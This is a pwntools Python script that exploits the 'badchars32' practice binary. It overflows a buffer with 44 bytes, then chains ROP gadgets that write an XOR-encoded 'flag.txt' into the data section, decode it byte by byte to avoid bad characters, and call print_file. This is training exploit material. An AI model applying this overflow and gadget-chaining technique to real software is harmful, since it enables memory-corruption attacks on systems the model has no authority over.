#!/bin/python3

from pwn import *

p = process("./badchars32")
p.recvuntil(">")

xored_flag = b"dnce,vzv" # flag.txt xored with value "2"
mov_esi_edi = p32(0x0804854f)
pop_esi_edi_ebp = p32(0x080485b9)
pop_ebp = p32(0x080485bb)
pop_ebx = p32(0x0804839d)
print_file = p32(0x080483d0)
xor_ebp_bl = p32(0x08048547)

data_section = 0x0804a018

xor_exploit = b""
data_offset = 0
value_to_xor = 2

for c in xored_flag:
    xor_exploit += pop_ebp
    xor_exploit += p32(data_section + data_offset)
    xor_exploit += pop_ebx
    xor_exploit += p32(value_to_xor)
    xor_exploit += xor_ebp_bl
    data_offset += 1

payload = b""
payload += b"A" * 44

payload += pop_esi_edi_ebp
payload += b"dnce"
payload += p32(data_section)
payload += p32(0x0)
payload += mov_esi_edi

payload += pop_esi_edi_ebp
payload += b",vzv"
payload += p32(data_section + 0x4)
payload += p32(0x0)
payload += mov_esi_edi

payload += xor_exploit

payload += print_file
payload += p32(0x0)
payload += p32(data_section)

p.sendline(payload)

print(p.recvall())

